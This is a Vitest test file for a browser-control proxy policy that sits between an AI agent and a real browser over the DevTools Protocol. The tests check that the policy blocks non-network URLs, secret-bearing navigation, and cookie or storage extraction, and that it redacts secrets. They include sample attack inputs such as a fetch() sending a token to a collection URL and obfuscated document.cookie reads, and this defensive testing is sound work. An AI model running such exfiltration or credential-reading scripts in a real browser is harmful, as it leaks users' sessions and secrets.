/**
 * @license
 * Copyright 2025 AionUi (aionui.com)
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, expect, it } from 'vitest';
import {
  SINGLE_BROWSER_CONTEXT_ID,
  SINGLE_SESSION_ID,
  SINGLE_TARGET_ID,
  buildListPayload,
  buildTargetInfo,
  buildVersionPayload,
  decideCdpCommand,
  decideCdpEvent,
  isAcceptableSessionId,
  projectCdpResult,
  sanitizeCdpUrlForAgent,
  tokensMatch,
} from '@process/resources/builtinMcp/cdpTargetProtocol';

const targetInfo = () => buildTargetInfo('Example', 'https://example.com/');

describe('cdpTargetProtocol — discovery payloads', () => {
  it('exposes webSocketDebuggerUrl, which is the only field puppeteer reads from /json/version', () => {
    const payload = buildVersionPayload('ws://127.0.0.1:1234/x', '120.0.0.0');
    expect(payload.webSocketDebuggerUrl).toBe('ws://127.0.0.1:1234/x');
    expect(payload.Browser).toContain('Chrome/');
  });

  it('reports exactly one page in /json/list', () => {
    const list = buildListPayload('ws://127.0.0.1:1234/x', 'Example', 'https://example.com/');
    expect(list).toHaveLength(1);
    expect(list[0].type).toBe('page');
    expect(list[0].id).toBe(SINGLE_TARGET_ID);
  });
});

describe('cdpTargetProtocol — Target.* handled locally', () => {
  it('backfills targetCreated when discovery is turned on, which is what unblocks puppeteer initialize()', () => {
    const decision = decideCdpCommand(
      { id: 1, method: 'Target.setDiscoverTargets', params: { discover: true } },
      targetInfo
    );
    expect(decision.kind).toBe('reply-and-emit');
    if (decision.kind !== 'reply-and-emit') return;
    expect(decision.emit).toHaveLength(1);
    expect(decision.emit[0].method).toBe('Target.targetCreated');
  });

  it('does not backfill when discovery is turned off', () => {
    const decision = decideCdpCommand(
      { id: 1, method: 'Target.setDiscoverTargets', params: { discover: false } },
      targetInfo
    );
    expect(decision.kind).toBe('reply');
  });

  it('returns a sessionId and emits attachedToTarget so flatten-mode routing works', () => {
    const decision = decideCdpCommand(
      { id: 2, method: 'Target.attachToTarget', params: { targetId: SINGLE_TARGET_ID, flatten: true } },
      targetInfo
    );
    expect(decision.kind).toBe('reply-and-emit');
    if (decision.kind !== 'reply-and-emit') return;
    expect(decision.payload.sessionId).toBe(SINGLE_SESSION_ID);
    expect(decision.emit[0].method).toBe('Target.attachedToTarget');
  });

  it('rejects attaching to an unknown target rather than silently using the only one', () => {
    const decision = decideCdpCommand(
      { id: 3, method: 'Target.attachToTarget', params: { targetId: 'someone-elses-page' } },
      targetInfo
    );
    expect(decision.kind).toBe('error');
  });

  it('reports a single target and a single browser context', () => {
    const targets = decideCdpCommand({ id: 4, method: 'Target.getTargets' }, targetInfo);
    expect(targets.kind).toBe('reply');
    if (targets.kind === 'reply') {
      expect(targets.payload.targetInfos).toHaveLength(1);
    }

    const contexts = decideCdpCommand({ id: 5, method: 'Target.getBrowserContexts' }, targetInfo);
    if (contexts.kind === 'reply') {
      expect(contexts.payload.browserContextIds).toEqual([SINGLE_BROWSER_CONTEXT_ID]);
    }
  });

  it('backfills attachment on the browser-level setAutoAttach', () => {
    // Verified against real puppeteer: acknowledging alone leaves browser.pages() at 0,
    // because only the attachedToTarget event marks a target as available.
    const decision = decideCdpCommand(
      {
        id: 6,
        method: 'Target.setAutoAttach',
        params: { autoAttach: true, flatten: true, filter: [{ type: 'page', exclude: true }] },
      },
      targetInfo
    );
    expect(decision.kind).toBe('reply-and-emit');
  });
});

describe('cdpTargetProtocol — refusals that protect the app', () => {
  it('errors on createTarget instead of pretending a new tab was opened', () => {
    // Silently returning the existing targetId would leave the agent driving the old
    // page while believing it had a new one.
    const decision = decideCdpCommand(
      { id: 7, method: 'Target.createTarget', params: { url: 'https://example.com' } },
      targetInfo
    );
    expect(decision.kind).toBe('error');
  });

  it('refuses Browser.close, which would terminate the whole application', () => {
    const decision = decideCdpCommand({ id: 8, method: 'Browser.close' }, targetInfo);
    expect(decision.kind).toBe('error');
  });

  it('refuses additional browser contexts', () => {
    expect(decideCdpCommand({ id: 9, method: 'Target.createBrowserContext' }, targetInfo).kind).toBe('error');
  });
});

describe('cdpTargetProtocol — forwarding', () => {
  it.each([
    'Accessibility.disable',
    'Accessibility.enable',
    'Accessibility.getFullAXTree',
    'DOM.disable',
    'DOM.enable',
    'DOM.getBoxModel',
    'Input.dispatchKeyEvent',
    'Input.dispatchMouseEvent',
    'Input.insertText',
    'Network.disable',
    'Network.enable',
    'Page.captureScreenshot',
    'Page.disable',
    'Page.enable',
    'Page.getLayoutMetrics',
    'Runtime.disable',
    'Runtime.enable',
  ])('forwards declared Browser Use profile method %s to the real debugger', (method) => {
    expect(decideCdpCommand({ id: 10, method }, targetInfo).kind).toBe('forward');
  });

  it('forwards ordinary http(s) navigation to the visible debugger target', () => {
    expect(
      decideCdpCommand({ id: 11, method: 'Page.navigate', params: { url: 'https://example.com/next' } }, targetInfo)
        .kind
    ).toBe('forward');
  });

  it('fails closed for an unknown CDP method', () => {
    expect(decideCdpCommand({ id: 12, method: 'Network.getResponseBody' }, targetInfo)).toEqual({
      kind: 'error',
      message: 'Command EVE CDP policy does not permit this method.',
    });
  });
});

describe('cdpTargetProtocol — browser egress floor', () => {
  it.each([
    'file:///tmp/secret.txt',
    'data:text/html,<h1>secret</h1>',
    'blob:https://example.com/1234',
    'javascript:alert(1)',
  ])('blocks non-network navigation before it reaches Electron: %s', (url) => {
    const decision = decideCdpCommand({ id: 12, method: 'Page.navigate', params: { url } }, targetInfo);
    expect(decision.kind).toBe('error');
  });

  it('blocks a secret-bearing URL without echoing the raw value', () => {
    const secret = 'sk-commandevebrowserproof123456789';
    const decision = decideCdpCommand(
      { id: 13, method: 'Page.navigate', params: { url: `https://example.com/?api_key=${secret}` } },
      targetInfo
    );
    expect(decision.kind).toBe('error');
    if (decision.kind !== 'error') return;
    expect(decision.message).not.toContain(secret);
  });

  it('blocks a secret-bearing runtime expression before it can call fetch', () => {
    const secret = 'sk-commandevebrowserproof123456789';
    const decision = decideCdpCommand(
      {
        id: 14,
        method: 'Runtime.evaluate',
        params: { expression: `fetch('https://example.com/collect?token=${secret}')` },
      },
      targetInfo
    );
    expect(decision.kind).toBe('error');
  });

  it.each(['Network.getCookies', 'Storage.getCookies', 'DOMStorage.getDOMStorageItems'])(
    'blocks raw credential extraction via %s',
    (method) => {
      expect(decideCdpCommand({ id: 15, method }, targetInfo).kind).toBe('error');
    }
  );

  it('blocks every arbitrary script syntax before Chromium can evaluate it', () => {
    for (const expression of [
      'JSON.stringify({url:location.href,title:document.title,w:innerWidth,h:innerHeight,sx:scrollX,sy:scrollY,pw:document.documentElement.scrollWidth,ph:document.documentElement.scrollHeight})',
      'document.readyState',
      '!!document.querySelector("#proof-copy")',
      'document.cookie',
      'document["coo" + "kie"]',
      'Reflect.get(document, "cookie")',
      'globalThis["local" + "Storage"].getItem("auth")',
      'localStorage.getItem("auth")',
      'indexedDB.databases()',
      'caches.keys()',
    ]) {
      expect(decideCdpCommand({ id: 16, method: 'Runtime.evaluate', params: { expression } }, targetInfo)).toEqual({
        kind: 'error',
        message: 'Command EVE blocks arbitrary page scripts; use typed browser operations.',
      });
    }
  });

  it.each([
    ['Runtime.callFunctionOn', { functionDeclaration: 'function(){ return document.cookie }' }],
    ['Runtime.compileScript', { expression: 'document.cookie' }],
    ['Runtime.runScript', { scriptId: 'stale-script' }],
    ['Debugger.evaluateOnCallFrame', { expression: 'document.cookie', callFrameId: 'frame' }],
    ['Page.addScriptToEvaluateOnLoad', { source: 'document.cookie' }],
    ['Page.addScriptToEvaluateOnNewDocument', { source: 'document.cookie' }],
  ])('blocks script-bearing method %s through one fail-closed policy', (method, params) => {
    expect(decideCdpCommand({ id: 17, method, params }, targetInfo)).toEqual({
      kind: 'error',
      message: 'Command EVE blocks arbitrary page scripts; use typed browser operations.',
    });
  });
});

describe('cdpTargetProtocol — outbound event projection', () => {
  it.each([
    'Network.requestWillBeSentExtraInfo',
    'Network.responseReceivedExtraInfo',
    'Network.webSocketFrameReceived',
    'Network.eventSourceMessageReceived',
    'Fetch.requestPaused',
    'Runtime.consoleAPICalled',
    'Runtime.exceptionThrown',
    'Runtime.bindingCalled',
    'Log.entryAdded',
  ])('drops secret-bearing or opaque event %s', (method) => {
    expect(
      decideCdpEvent(method, {
        headers: { cookie: 'session=raw-secret', authorization: 'Bearer raw-secret' },
        associatedCookies: [{ cookie: { value: 'raw-secret' } }],
        args: [{ value: 'raw-secret' }],
      })
    ).toBeNull();
  });

  it('projects only the request id needed by Browser Use network-idle tracking', () => {
    expect(
      decideCdpEvent('Network.requestWillBeSent', {
        requestId: 'request-1',
        request: {
          url: 'https://example.com/?token=raw-secret',
          headers: { Cookie: 'session=raw-secret' },
          postData: 'raw-secret',
        },
      })
    ).toEqual({ method: 'Network.requestWillBeSent', params: { requestId: 'request-1' } });
  });

  it('projects safe page lifecycle fields and drops unknown values', () => {
    expect(
      decideCdpEvent('Page.lifecycleEvent', {
        frameId: 'frame-1',
        loaderId: 'loader-1',
        name: 'networkIdle',
        timestamp: 42,
        secret: 'raw-secret',
      })
    ).toEqual({
      method: 'Page.lifecycleEvent',
      params: { frameId: 'frame-1', loaderId: 'loader-1', name: 'networkIdle', timestamp: 42 },
    });
  });

  it('removes editable AX values and redacts secret-bearing readable text', () => {
    const secret = 'sk-commandeveresultproof123456789';
    expect(
      projectCdpResult('Accessibility.getFullAXTree', {
        nodes: [
          {
            nodeId: 'node-1',
            ignored: false,
            role: { type: 'role', value: 'textbox' },
            name: { type: 'computedString', value: `token ${secret}` },
            value: { type: 'string', value: 'raw-password-or-otp' },
            properties: [{ name: 'autocomplete', value: { value: 'current-password' } }],
            backendDOMNodeId: 42,
          },
        ],
      })
    ).toEqual({
      nodes: [
        {
          nodeId: 'node-1',
          ignored: false,
          role: { type: 'role', value: 'textbox' },
          name: { type: 'computedString', value: '[redacted]' },
          backendDOMNodeId: 42,
        },
      ],
    });
  });

  it('removes URL credentials, query, fragment, and sensitive paths from target discovery', () => {
    expect(sanitizeCdpUrlForAgent('https://user:pass@example.com/page?code=secret#fragment')).toBe(
      'https://example.com/page'
    );
    expect(sanitizeCdpUrlForAgent('file:///tmp/private.txt')).toBe('about:blank');
  });
});

describe('cdpTargetProtocol — session routing', () => {
  it('accepts browser-level (absent/empty) and our own page session', () => {
    expect(isAcceptableSessionId(undefined)).toBe(true);
    expect(isAcceptableSessionId('')).toBe(true);
    expect(isAcceptableSessionId(SINGLE_SESSION_ID)).toBe(true);
  });

  it('rejects a foreign sessionId rather than treating it as browser-level', () => {
    expect(isAcceptableSessionId('some-other-session')).toBe(false);
  });
});

describe('cdpTargetProtocol — token comparison', () => {
  it('matches identical tokens and rejects differences', () => {
    expect(tokensMatch('abc123', 'abc123')).toBe(true);
    expect(tokensMatch('abc123', 'abc124')).toBe(false);
  });

  it('rejects a correct prefix, so a shorter guess cannot pass', () => {
    expect(tokensMatch('abc123', 'abc')).toBe(false);
    expect(tokensMatch('abc', 'abc123')).toBe(false);
  });

  it('rejects an empty candidate against a real token', () => {
    expect(tokensMatch('realtoken', '')).toBe(false);
  });
});

/**
 * 以下三条来自用真实 puppeteer-core 跑集成验证时踩到的坑，固化成回归测试。
 * Regression tests for three bugs found while verifying against real puppeteer-core.
 */
describe('cdpTargetProtocol — regressions found against real puppeteer', () => {
  it('backfills attachedToTarget on the browser-level setAutoAttach, or browser.pages() stays empty', () => {
    // getAvailableTargets() reads #attachedTargetsByTargetId, which only the
    // attachedToTarget event populates — targetCreated alone is not enough.
    const decision = decideCdpCommand(
      { id: 1, method: 'Target.setAutoAttach', params: { autoAttach: true, flatten: true } },
      targetInfo
    );
    expect(decision.kind).toBe('reply-and-emit');
    if (decision.kind !== 'reply-and-emit') return;
    expect(decision.emit.map((e) => e.method)).toContain('Target.attachedToTarget');
  });

  it('does NOT backfill on a session-scoped setAutoAttach, which would loop forever', () => {
    // puppeteer answers attachedToTarget by issuing setAutoAttach on the new session;
    // backfilling there produced setAutoAttach -> attachedToTarget -> setAutoAttach ...
    // and the connection never finished initialising.
    const decision = decideCdpCommand(
      {
        id: 2,
        method: 'Target.setAutoAttach',
        params: { autoAttach: true, flatten: true },
        sessionId: SINGLE_SESSION_ID,
      },
      targetInfo
    );
    expect(decision.kind).toBe('reply');
  });

  it('reports a non-empty url, since PageTarget stays uninitialised while url is empty', () => {
    // PageTarget._checkIfInitialized() only resolves once targetInfo.url !== ''.
    const info = buildTargetInfo('', 'https://example.com/');
    expect(info.url).not.toBe('');
  });
});
